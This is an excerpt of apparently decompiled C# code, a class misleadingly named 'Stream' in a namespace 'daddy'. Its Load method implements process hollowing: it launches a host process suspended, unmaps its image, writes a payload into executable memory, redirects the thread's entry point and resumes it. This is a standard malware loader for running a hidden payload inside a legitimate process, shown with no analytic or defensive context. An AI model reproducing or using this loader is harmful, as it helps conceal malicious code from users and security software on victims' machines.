...
namespace daddy
{
    public static class Stream
    {
        ...
        {
            return daddy.Stream.Align(Marshal.AllocHGlobal(size + alignment / 2), alignment);
        }
        ...
        public static void Load(byte[] payloadBuffer, string host, string args)
        {
            ...
            IntPtr intPtr = daddy.Stream.Allocate(1232, 16);
            string str = host;
            ...
            daddy.Stream.CreateProcess(null, str, IntPtr.Zero, IntPtr.Zero, true, 4, IntPtr.Zero, currentDirectory, numArray, numArray1);
            long num7 = Marshal.ReadInt64(numArray1, 0);
            long num8 = Marshal.ReadInt64(numArray1, 8);
            daddy.Stream.ZwUnmapViewOfSection(num7, num6);
            daddy.Stream.VirtualAllocEx(num7, num6, (long)num1, 12288, 64);
            daddy.Stream.WriteProcessMemory(num7, num6, payloadBuffer, num2, (long)0);
            for (short i = 0; i < num4; i = (short)(i + 1))
            {
                ...
                daddy.Stream.WriteProcessMemory(num7, num6 + (long)num9, numArray3, (int)numArray3.Length, (long)0);
            }
            daddy.Stream.GetThreadContext(num8, intPtr);
            byte[] bytes = BitConverter.GetBytes(num6);
            long num12 = Marshal.ReadInt64(intPtr, 136);
            daddy.Stream.WriteProcessMemory(num7, num12 + (long)16, bytes, 8, (long)0);
            Marshal.WriteInt64(intPtr, 128, num6 + (long)num3);
            daddy.Stream.SetThreadContext(num8, intPtr);
            daddy.Stream.ResumeThread(num8);
            Marshal.FreeHGlobal(intPtr);
            daddy.Stream.CloseHandle(num7);
            daddy.Stream.CloseHandle(num8);
        }
